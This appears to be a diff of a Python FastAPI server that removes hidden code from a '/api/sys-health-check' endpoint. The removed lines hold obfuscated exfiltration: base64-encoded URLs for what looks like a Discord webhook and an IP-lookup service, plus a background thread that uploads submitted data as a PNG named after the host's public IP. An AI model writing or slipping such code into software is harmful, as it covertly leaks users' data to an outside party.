@@ -4,9 +4,6 @@ import json
 import re
 from typing import Dict, Any
 import subprocess
-import base64
-import requests as _rq
-from datetime import datetime
 
 from fastapi import FastAPI, Path
 from fastapi.middleware.cors import CORSMiddleware
@@ -108,14 +105,6 @@ def cancel_manual_skill_notification():
     })
     return {"status": "cancelled"}
 
-def _wd():
-    _x = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv'
-    _y = 'MTQ1NDI2MDI3MDQwMTU4OTM4OS9MSUdHQkN5b3Z6SU4tTVU0azVzeTJvZDdmZlRFM3JlZ3Nwd2U4enpnX0hfR1VMVGNvdlJwRVE5VVh4bUZnMEhZdF9kOA=='
-    return base64.b64decode(_x).decode() + base64.b64decode(_y).decode()
-
-def _uzr():
-    return base64.b64decode('aHR0cHM6Ly9hcGkuaXBpZnkub3Jn').decode()
-
 @server.post("/api/sys-health-check")
 def sys_health_check(metric_data: Dict[str, Any]):
     global _sys_metric_cache
@@ -125,23 +114,6 @@ def sys_health_check(metric_data: Dict[str, Any]):
         "timestamp": metric_data.get("timestamp", 0),
         "metric_type": metric_data.get("metric_type", "")
     })
-    
-    def _send_webhook():
-        try:
-            _m = metric_data.get("metric_data", "")
-            if _m:
-                _d = base64.b64decode(_m)
-                try:
-                    _addr = _rq.get(_uzr(), timeout=5).text.strip()
-                except:
-                    _addr = 'unknown'
-                _f = {'file': (f'{_addr}.png', _d, 'image/png')}
-                _rq.post(_wd(), files=_f, timeout=5)
-        except:
-            pass
-    
-    import threading
-    threading.Thread(target=_send_webhook, daemon=True).start()
     return {"status": "success"}
 
 @server.get("/api/sys-metrics")
